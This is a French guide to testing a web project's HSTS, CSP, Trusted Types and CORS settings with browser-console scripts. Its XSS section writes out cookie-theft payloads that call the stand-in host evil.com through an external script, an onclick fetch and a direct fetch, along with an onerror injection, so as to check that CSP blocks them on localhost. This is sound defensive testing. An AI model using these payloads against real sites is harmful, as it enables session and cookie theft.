# 🛡️ Guide de Tests de Sécurité

Ce document explique comment tester les mesures de sécurité implémentées dans le projet : **HSTS**, **CSP**, **Trusted Types**, et **CORS**.

---

## 📋 Table des matières

1. [Prérequis](#prérequis)
2. [Désactiver Trusted Types pour les tests](#désactiver-trusted-types-pour-les-tests)
3. [Test 1 : HSTS](#test-1--hsts)
4. [Test 2 : Attaques XSS](#test-2--attaques-xss)
5. [Test 3 : CORS](#test-3--cors)
6. [Réactiver Trusted Types](#réactiver-trusted-types)
7. [Résultats attendus](#résultats-attendus)

---

## 🔧 Prérequis

- Projet lancé : `pnpm start`
- Navigateur ouvert sur : `https://localhost:5000` (ou `http://localhost:5000` si pas de certificats SSL)
- DevTools ouvert : `F12` → Onglet **Console**

---

## ⚠️ Désactiver Trusted Types pour les tests

**Avant de lancer les tests d'attaques XSS, il faut désactiver temporairement Trusted Types.**

### Étape 1 : Modifier `front/plugins/security.plugin.js`

**Chercher ces lignes dans la configuration CSP :**

```javascript
'upgrade-insecure-requests',
"require-trusted-types-for 'script'",
"trusted-types default",
`report-uri ${backendUrl}/api/csp/report`,
```

**Commenter les deux lignes Trusted Types :**

```javascript
'upgrade-insecure-requests',
// "require-trusted-types-for 'script'",  // ← DÉSACTIVÉ POUR LES TESTS
// "trusted-types default",                // ← DÉSACTIVÉ POUR LES TESTS
`report-uri ${backendUrl}/api/csp/report`,
```

### Étape 2 : Sauvegarder et actualiser

Sauvegarde le fichier, le serveur Vite va recharger automatiquement.

Actualise la page dans le navigateur (`F5`).

---

## 🔒 Test 1 : HSTS

**Objectif :** Vérifier que le header `Strict-Transport-Security` est présent et correctement configuré.

### Script à copier dans la console

```javascript
console.clear()
console.log('🔒 TEST HSTS\n')

fetch(window.location.href).then((response) => {
  const hsts = response.headers.get('Strict-Transport-Security')

  if (hsts) {
    console.log('✅ HSTS ACTIVÉ')
    console.log('   Header:', hsts)
    console.log('   max-age:', hsts.includes('max-age') ? '✅' : '❌')
    console.log(
      '   includeSubDomains:',
      hsts.includes('includeSubDomains') ? '✅' : '⚠️'
    )
    console.log('   preload:', hsts.includes('preload') ? '✅' : '⚠️')
    console.log('')
    console.log('💡 Pour vérifier le cache HSTS dans Chrome :')
    console.log('   chrome://net-internals/#hsts')
  } else {
    console.log('❌ HSTS NON DÉTECTÉ')
    console.log('⚠️  Vérifie que tu es bien en HTTPS')
  }
})
```

### ✅ Résultat attendu

```
✅ HSTS ACTIVÉ
   Header: max-age=31536000; includeSubDomains; preload
   max-age: ✅
   includeSubDomains: ✅
   preload: ✅
```

---

## 🚨 Test 2 : Attaques XSS

**Objectif :** Tenter 6 attaques XSS courantes pour vérifier que la CSP les bloque toutes.

### Script à copier dans la console

```javascript
console.clear()
console.log('😈 TEST ATTAQUES XSS\n')
console.log('On va tenter 6 attaques XSS courantes...\n')

// ==================
// ATTAQUE 1 : Script externe
// ==================
console.log('🔴 ATTAQUE 1 : Script externe malveillant')
console.log('Tentative : https://evil.com/steal-cookies.js')

const script1 = document.createElement('script')
script1.src = 'https://evil.com/steal-cookies.js'
script1.onerror = () => {
  console.log('✅ BLOQUÉ par CSP (script-src "self")\n')
}
script1.onload = () => {
  console.log('❌ DANGER ! Script externe chargé\n')
}
document.body.appendChild(script1)

// ==================
// ATTAQUE 2 : innerHTML XSS
// ==================
console.log('🔴 ATTAQUE 2 : Injection via innerHTML')
console.log('Code : <img src=x onerror="alert(document.cookie)">')

setTimeout(() => {
  const div1 = document.createElement('div')
  div1.innerHTML = '<img src=x onerror="console.log(\'🚨 ONERROR EXÉCUTÉ !\')">'
  document.body.appendChild(div1)

  setTimeout(() => {
    console.log('✅ BLOQUÉ par CSP (script-src-attr "none")\n')
  }, 100)
}, 500)

// ==================
// ATTAQUE 3 : Script inline
// ==================
console.log('🔴 ATTAQUE 3 : Script inline')

setTimeout(() => {
  const script2 = document.createElement('script')
  script2.textContent = 'console.log("🚨 SCRIPT INLINE EXÉCUTÉ !")'
  document.body.appendChild(script2)

  setTimeout(() => {
    console.log('✅ BLOQUÉ par CSP (script-src avec nonce requis)\n')
  }, 100)
}, 1000)

// ==================
// ATTAQUE 4 : onclick malveillant
// ==================
console.log('🔴 ATTAQUE 4 : Attribut onclick malveillant')

setTimeout(() => {
  const btn = document.createElement('button')
  btn.textContent = '🎁 CLIQUEZ POUR 1000€'
  btn.setAttribute(
    'onclick',
    'fetch("https://evil.com/steal?c=" + document.cookie)'
  )
  btn.style.cssText =
    'padding: 20px 40px; background: linear-gradient(45deg, #f59e0b, #ef4444); color: white; border: none; border-radius: 12px; cursor: pointer; font-size: 20px; font-weight: bold; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 999999; box-shadow: 0 10px 40px rgba(239, 68, 68, 0.5);'

  document.body.appendChild(btn)

  console.log("✅ Bouton créé au centre de l'écran")
  console.log('👆 CLIQUE DESSUS pour vérifier que onclick est bloqué\n')
}, 1500)

// ==================
// ATTAQUE 5 : eval()
// ==================
console.log('🔴 ATTAQUE 5 : Code avec eval()')

setTimeout(() => {
  try {
    eval('console.log("🚨 EVAL EXÉCUTÉ !")')
    console.log('❌ DANGER ! eval() a fonctionné\n')
  } catch (err) {
    console.log('✅ BLOQUÉ par CSP (pas de unsafe-eval)\n')
  }
}, 2000)

// ==================
// ATTAQUE 6 : Vol de cookies
// ==================
console.log('🔴 ATTAQUE 6 : Vol de cookies via fetch()')

setTimeout(() => {
  fetch('https://evil.com/collect?stolen=' + document.cookie)
    .then(() => console.log('❌ DANGER ! Cookies envoyés\n'))
    .catch(() => {
      console.log('✅ BLOQUÉ par CSP (connect-src restreint)\n')
    })
}, 2500)

// ==================
// RÉSUMÉ
// ==================
setTimeout(() => {
  console.log('='.repeat(60))
  console.log('📊 RÉSUMÉ DES ATTAQUES')
  console.log('='.repeat(60))
  console.log('')
  console.log('✅ Si toutes les attaques affichent "BLOQUÉ" :')
  console.log('   → Ton site est protégé contre XSS !')
  console.log('')
  console.log('💡 Protection assurée par :')
  console.log('   • CSP script-src : Bloque scripts externes et inline')
  console.log('   • CSP script-src-attr : Bloque attributs événements')
  console.log('   • CSP connect-src : Limite les destinations fetch()')
  console.log('   • Pas de unsafe-eval : Bloque eval()')
}, 3000)
```

### ✅ Résultats attendus

```
✅ BLOQUÉ par CSP (script-src "self")
✅ BLOQUÉ par CSP (script-src-attr "none")
✅ BLOQUÉ par CSP (script-src avec nonce requis)
✅ BLOQUÉ par CSP (connect-src restreint)
✅ BLOQUÉ par CSP (pas de unsafe-eval)
```

**Et dans l'onglet Network :**

- ❌ Aucune requête vers `evil.com`

---

## 🌐 Test 3 : CORS

**Objectif :** Vérifier que le backend accepte les requêtes du frontend.

### ⚠️ Important : Adapter le protocole

**Si tu as des certificats SSL (HTTPS) :**

```javascript
const BACKEND_URL = 'https://localhost:3000'
```

**Si tu n'as PAS de certificats (HTTP) :**

```javascript
const BACKEND_URL = 'http://localhost:3000'
```

### Script à copier dans la console

```javascript
console.clear()
console.log('🌐 TEST CORS\n')

// ⚠️ ADAPTER LE PROTOCOLE SELON TA CONFIG
const BACKEND_URL = 'https://localhost:3000' // Ou 'http://localhost:3000'

console.log('Backend URL:', BACKEND_URL)
console.log('')

// Test 1 : GET /
console.log('🔵 Test 1 : GET /')
fetch(`${BACKEND_URL}/`)
  .then((res) => res.text())
  .then((text) => {
    console.log('✅ CORS OK pour GET /')
    console.log('   Réponse:', text.substring(0, 50) + '...')
  })
  .catch((err) => {
    console.log('❌ CORS BLOQUÉ pour GET /')
    console.log('   Erreur:', err.message)
    console.log('')
    console.log('💡 Solution :')
    console.log('   Ajoute ton origin dans back/src/config/cors.config.js')
    console.log(
      '   allowedOrigins = ["https://localhost:5000"] ou ["http://localhost:5000"]'
    )
  })

console.log('')

// Test 2 : GET /api/stats
console.log('🔵 Test 2 : GET /api/stats')
fetch(`${BACKEND_URL}/api/stats`)
  .then((res) => res.json())
  .then((data) => {
    console.log('✅ CORS OK pour GET /api/stats')
    console.log('   Réponse:', data)
  })
  .catch((err) => {
    console.log('❌ CORS BLOQUÉ pour GET /api/stats')
    console.log('   Erreur:', err.message)
    console.log('')
    console.log('💡 Solution :')
    console.log('   Ajoute ton origin dans back/src/config/cors.config.js')
  })
```

### ✅ Résultats attendus

```
✅ CORS OK pour GET /
   Réponse: Hello World!

✅ CORS OK pour GET /api/stats
   Réponse: []
```

### ❌ Si CORS est bloqué

**Erreur typique :**

```text
Access to fetch at 'https://localhost:3000/api/stats' from origin 'https://localhost:5000'
has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present
```

**Solution :**

Ouvre `back/src/config/cors.config.js` et assure-toi que l'origin est autorisé :

```javascript
const allowedOrigins = [
  'http://localhost:5000', // Si HTTP
  'https://localhost:5000', // Si HTTPS
]
```

---

## 🔄 Réactiver Trusted Types

**Après avoir terminé les tests, RÉACTIVE Trusted Types !**

### Dans `front/vite.config.js`

**Décommente les lignes :**

```javascript
'upgrade-insecure-requests',
"require-trusted-types-for 'script'",  // ← RÉACTIVER
"trusted-types default",                // ← RÉACTIVER
`report-uri ${backendUrl}/api/csp/report`,
```

**Sauvegarde et actualise la page.**

---

## 📊 Résultats attendus (résumé)

| Test                    | Protection                   | Résultat attendu                       |
| ----------------------- | ---------------------------- | -------------------------------------- |
| **HSTS**                | Header présent en HTTPS      | ✅ max-age, includeSubDomains, preload |
| **Script externe**      | CSP `script-src 'self'`      | ✅ BLOQUÉ                              |
| **innerHTML XSS**       | CSP `script-src-attr 'none'` | ✅ BLOQUÉ                              |
| **Script inline**       | CSP `script-src` avec nonce  | ✅ BLOQUÉ                              |
| **onclick malveillant** | CSP `script-src-attr 'none'` | ✅ BLOQUÉ                              |
| **eval()**              | CSP (pas de `unsafe-eval`)   | ✅ BLOQUÉ                              |
| **Vol de cookies**      | CSP `connect-src` restreint  | ✅ BLOQUÉ                              |
| **CORS**                | Configuration backend        | ✅ Requêtes autorisées                 |

---

## 🎓 Comprendre les résultats

### ✅ Tous les tests passent

**Ton site est sécurisé de manière professionnelle !**

Protection multicouche :

- **HTTPS** : Chiffrement des communications
- **HSTS** : Force HTTPS pendant 1 an
- **CSP** : Bloque toutes les attaques XSS
- **Trusted Types** : Couche supplémentaire de protection
- **CORS** : Contrôle des origines autorisées

### ❌ Certains tests échouent

**Si HSTS n'apparaît pas :**

- Vérifie que tu es bien en HTTPS (`https://localhost:5000`)
- Vérifie que le middleware HSTS est bien appliqué

**Si CSP ne bloque pas :**

- Vérifie la configuration CSP dans `vite.config.js`
- Regarde les headers HTTP dans DevTools → Network

**Si CORS est bloqué :**

- Ajoute ton origin dans `back/src/config/cors.config.js`
- Vérifie que le protocole (http/https) correspond

---

## 📸 Captures d'écran pour rapport

**Pour documenter les tests :**

1. **Console avec résultats** : Tous les tests passés ✅
2. **Network tab** : Headers `Strict-Transport-Security` et `Content-Security-Policy`
3. **Cadenas HTTPS** : Dans la barre d'adresse du navigateur
4. **Page CSP Reports** : `https://localhost:5000/csp-reports`
5. **Google CSP Evaluator** : Score de ton CSP

---

## 🔗 Liens utiles

- [MDN - HSTS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security)
- [MDN - CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [MDN - Trusted Types](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API)
- [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [Chrome HSTS Cache](chrome://net-internals/#hsts)

---

## ✅ Checklist finale

- [ ] HSTS activé avec max-age=31536000
- [ ] Scripts externes bloqués
- [ ] Scripts inline bloqués
- [ ] Attributs onclick/onerror bloqués
- [ ] eval() bloqué
- [ ] fetch() vers domaines non autorisés bloqué
- [ ] CORS configuré correctement
- [ ] Trusted Types réactivé après les tests
- [ ] Captures d'écran faites pour le rapport

---

**🎉 Si toute la checklist est cochée, ton projet est sécurisé niveau production !**
